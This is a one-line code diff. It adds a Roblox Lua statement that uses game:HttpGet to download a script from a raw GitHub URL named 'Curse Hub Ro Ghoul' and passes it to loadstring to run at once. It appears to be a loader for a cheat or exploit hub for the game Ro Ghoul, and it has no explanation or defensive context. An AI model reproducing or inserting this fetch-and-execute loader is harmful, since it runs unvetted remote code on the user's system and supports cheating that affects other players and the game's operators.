@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/CurseOfDarkness/CurseHubRoGhoul/main/Curse%20Hub%20Ro%20Ghoul"))()
